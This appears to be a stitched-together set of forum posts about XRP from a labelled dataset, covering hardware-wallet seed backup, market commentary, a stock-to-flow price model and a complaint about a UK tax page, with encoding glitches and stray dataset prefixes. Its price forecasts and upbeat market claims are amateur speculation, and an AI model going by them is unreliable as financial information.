When you setup the ledger you copy that down from the device screen. I made a table with two 12 row numbered columns to write down the seed words (to mirror the metal seed backup layout). Then you have to re-enter it to verify. Then you can load wallets which also generate self-deterministic keys in the ledger H/W. The Seed can restore the wallet to any other ledger, or to any BIP39 standard software wallet. Of course once you load a software wallet onto a computer, it means your key is no longer secure because it's stored digitally and a hacker can potentially access it.

The Nano uses a 4-8 digit pin, if you enter it wrong 3 times it wipes the device and it must be recovered from seed. Once the wallet is setup, it's a good idea to test a small deposit, reset the nano and restore the wallet from the seed. This ensures you will be able to do it should the need arise.

The seed phrase must never be shown to anyone, have a picture taken of it. don't do it in front of a laptop or with a phone in the room. If anyone gets the seed they can load the wallet and transfer all your coins/tokens into their own wallet.

To protect from fire use titanium plates (crypto steel or similar) to punch the 24 word seed into the metal plate. The Nano will cost $100, the Plates ~20, the Punch Set $15 and a jeweler's plate ~$15 (4x4x3/4 works great). It won't rust or melt in a fire. Once punched, burn the paper seed word completely.

The nano should eventually be kept in a safety deposit box at the bank. The pin protects it even from the state (and you could always have a contingency plan others could enact to move your funds should it get seized by one of the alphabet agencies), and it protects you from home invasion to steal your crypto (there are several brutal cases of this - do not keep that shit at your home if it has significant money on it).

The seed should be kept with another person (preferably far away) you trust at a separate location from your home. You could put it in a safe (time locked) or bury it in a garden. A comment below suggests using plasti dip spray paint to coat the metal and disguise it. The same person or another person should know what it is, and how to recover it or who to take it to in the event something should happen to you.

There's currently a billion plus in lost XRP because a millionaire investor died on the way to drug rehab and his family can't recover it.

You can deposit to the address without the ledger, but to spend you need the nano plugged into an internet connected computer and it requires a button press on the nano to confirm any spend. At the bank you can bring in a laptop, plug in your nanno, and transfer to your brokerage, credit card account, and wallets for the week/month, and lock it back up.

When it comes time to spend you will have a credit card with an account that you load up with XRP to spend directly into fiat and mobile wallet for direct XRP purchases. For larger fiat withdraws you can go back through uphold or similar and into a bank account.

0,xrp,"A potential future use case of XRP For everybody that don‚Äôt know what SDR (Special Drawing Right) is it‚Äôs a supplementary international reserve asset created in 1969 by the IMF (international monetary fund). The SDR is neither a currency, nor a claim on the IMF. Rather, it is a potential claim on the freely usable currencies of IMF members. In addition to its role as a supplementary reserve asset, the SDR serves as the unit of account of the IMF and some other international organizations. The SDR value is made up of 0.58252 (41.73%) USD 0.38671 (30.93%) EUR 1.0174 (10.92%) CNY 11.900 (8.33%) JPY 0.085946 (8.09%) GBP and these percentage are fixed till 2020. The total amount of SDR is worth around 295 billion dollar.

The problem of SDR is its liquidity, SDR cannot be sold directly by an country. It has to be traded between two countries in exchange for freely usable currencies. However, in the event that there is insufficient capacity, the IMF can activate the designation mechanism. Under this mechanism, members with sufficiently strong external positions are designated by the IMF to buy SDRs with freely usable currencies up to certain amounts from members with weak external positions. This arrangement serves as a backstop to guarantee the liquidity and the reserve asset character of the SDR.

So why use XRP instead? First of all to fix its liquidity problems. But let‚Äôs say shit really hits the fan(worldwide financial crisis) and not a single country wants to buy the SDR? Then it is basically useless in the event of a crisis because the trading can only happen if two countries make an agreement which is a slow progress. But with XRP you would not have this problem, there are dozens of exchanges worldwide with enough liquidity to provide smooth trading. And if Ripple will succeed in the future with banks to fully implement xRapid (and it will) It becomes much more secure to hold XRP and ensure they can exchange it with other countries. Guys this was just a little thought experiment I had about a potential use case of XRP. I‚Äôm not an economist by any means so don‚Äôt be too harsh on me. And sorry for any bad grammar English is not my native language.

At the time of writing, Ripple was down by almost 30% amid a cryptocurrency market crash and was trading at around $0.75.

Ripple XRP prices are being impacted due to the overall cryptomarket suffering from an influx of negative news of late. News that South Korea would not be banning cryptocurrencies was encouraging, but then the message from the Indian Finance Minister, Arun Jaitley, was painted in a negative light to convey that there was no place for cryptocurrency in the growing digital economy of India.

However, he clearly mentioned that India was open to exploring the applications of blockchain technology. Somehow, this is not being taken as a positive for Ripple XRP, which is so different from other cryptocurrencies. There has been a spate of other positive news for XRP but nothing is able to stop the plunge in the Ripple XRP price at the moment. However, there can be no denying the fact that in the long term, digital currencies that offer real-world utility shall stand out. Ripple XRP appears to one of this promising bunch.

\- XRapid is now live

\- We have several big name partnerships with more on the way

\- Regulatory direction is becoming more favorable with a great lobbying effort now underway

\- We are still up 60% from recent lows

But I think that there needs to be regulation on coins and reduction of volatility. For example lets say XRP is more accepted and I'm paying for a Coca Cola drink. I won't want to pay 10 xrp today and then 20 xrp tomorrow. There has to be some control of how the value of the currency behaves. 

Now everyone seems to think that a private company controls XRP. Even though it does not, people have a problem with it. However for years, the Federal Reserve has been controlling the USD and other Central Banks have been doing the same with their currency. There are reasons why countries inflate or deflate their currency. Now since XRP is not being made the way the dollar is printed, based on the demand and supply, there has to be proper valuation of XRP."

0,xrp,"#XRPTHESTANDARD In my very humble opinion, 

1. We should first and foremost break the ""Ripple/XRP"" intertwined understanding. In other words, stop perceiving Ripple as the ""Soul"" controller of the XRP infrastructure. Always reiterate the XRP's sovereignty. In other words ""Ask not what Ripple can do for XRP, ask  what the community can do for XRP""

2. New use cases will drive demand, demand will regulate price action. We need to think LONG TERM. A get rich quick scheme is not what we should look for in crypto (Those days are long gone)

3. The crypto space is a nascent market, nothing is going to go the way we expect it. STOP the price predictions, it is FOOLISH. In any case, the money that we have ""invested"" shouldn't matter because it's money that we were WILLING TO LOSE ( I hope all of us understand that).

It is important to stress the new use cases point because it is the only way that we can expect for this to give XRP the respect it deserves."

0,xrp,"January was tough...not gonna lie. Hi guys,

Long time lurker, first time poster. I just wanted to share my story with others that may be in my position.

I am still fairly new to crypto - I got in early December. Saw prices going up as I was trading in small amounts, then foolishly went all-in on a select few crypto's, XRP mostly, in early January - which turned out to be the ATH. Didn't know it at the time, but it's obvious to me now. The crash literally started a few hours afterwards. Embarrassingly, I bought in at around $4.00 AUD.

January/February has been tough...seeing my portfolio go down around 70%. Repeatedly checking the price every day doesn't help either. The thing is though...I'm not all that worried. I mean, don't get me wrong - it hurts to see. But fundamentally nothing has changed with Ripple/XRP. In fact, there's only been a plethora of good news and partnerships lately. What's clear now is that it was just way overpriced and a lot of emotion-based trading. Unfortunately, I fell for it too and well...lets just say these bags are heavy.

As far as I'm concerned, it's not a case of IF the price of XRP will climb back up, but WHEN. I'm still optimistic that we will see higher highs in 2018, it might just take a bit longer than expected. I'm in the crypto market not because I wanted a lambo (lambo would be nice though), but I'm hoping that this opportunity will bring me financial freedom and help me save for my wedding.

So, I'm holding strong. Cheers! *clink*"

I've seen 12 corridors on utility-scan. There are thousands to be added and many multiples of volume to capture. Expect daily or near daily records from now on.

This is almost the entire current market cap of XRP. Which means that if XRP is to become the standard way to transfer money globally, the price would almost certainly have to rise... but how much?

Does anyone have a deeper insight as to what these numbers mean? Isn't a price of $5 more than enough to handle all global transactions?"

Hello XRP community,

So I have had some time to work on this as I'm currently looking for a new job (London area, if there's any recruiters out there). I am a huge fan of PlanB's ( [**@100trillionUSD**](https://twitter.com/100trillionUSD) ) stock-to-flow model that he used to build a predictive model for BTC's price/market cap. His model is based on total supply of BTCs available against the supply being mined/introduced to the market - it is surprisingly good and is fast becoming the go-to model to understand if BTC's price is under/over appreciated.

Now, I thought about applying the same model to XRP but, as PlanB himself points out, it doesn't work. I won't get into too much detail why he thinks the model is not applicable to XRP because I think they are biased and unfounded but I think the main reason why it doesn't work is because the initial 100 billion XRP were all pre-mined. If we use Ripple's monthly XRP release, it doesn't seem to have much correlation with the price overall (I'm not saying it doesn't influence the price down or up in the short term).

I found that the only thing that seems to increase XRP's scarcity over time, albeit in small quantities, is the amount of XRP burnt in each transaction so that's what I'm using in the image I provided. I won't get into much detail here either as this post is already getting too long but if there's enough interest I can create an article on Medium where I get into more detail and provide more data.

All else being equal and excluding speculation, the model predicts a current price for XRP between $0.54-$0.75 telling us that it's seriously undervalued at the moment.

A price of $589 would be expected in just over 20 years.

A price of $1 in just over half a year.

Back to the ATH price of $3.4 in over 2 years.

Disclaimer: I'm not trying to give anyone any false hopes or financial advice. I would just like to know your thoughts on what you think makes XRP's price move, how and why. I'm open to any criticism just be nice please."

0,xrp,"UK government ignorance vs XRP/Ripple I posted the below to /r/ripple but I got a refusal message due to karma. I haven't used reddit alot and the message told me to try here as it doesn't have karma requirements. Sorry if it's not posted it the right place. 

I have only posted on reddit I think once or twice before. I don't want to make this a big post so will try to keep it as small as possible and will answer any questions if they arise, although, I think you all will get the gist.
Straight away I will say I have a pet hate of people calling XRP > Ripple.
Back in December, coindesk, the anti XRP biased trash site, alerted me to the fact that the UK government had released info on how it would be treating crypto in the future in regards to taxation to UK citizens.
I followed the link...
https://www.gov.uk/government/publications/tax-on-cryptoassets/cryptoassets-for-individuals
You dont have to read it all, around 3/4 the way down, under the header > Self Assessment tax returns > you can find them mentioning exchanging Bitcoin for Ripple.
I sent a email before December 19th, explaining to them their mistake and asking them to correct it. On Dec 19th I recieved an automated email saying it will be passed on to the relevant division.
I have recieved no less than 3 other emails stating that its being passed on to other people up to the 28th December.
After that, communication ceased and nothing has changed on the website.
So, obviously they dont care to listen to just one person with a minor (in their heads) complaint.
I was hoping the XRP army might feel it necessary to send a few emails their way, correcting them on their mistake.> https://www.gov.uk/contact/govuk
If you choose to send a email via this form please make sure to click on ""SPECIFIC PAGE"" tick box and copy paste this link>https://www.gov.uk/government/publications/tax-on-cryptoassets/cryptoassets-for-individuals

I know the XRP army gets called to arms mainly on twitter, but I really dont do any of the social media, so maybe one or two of you on here could get the word along and see if we cant kick that UK GOV arse into gear.
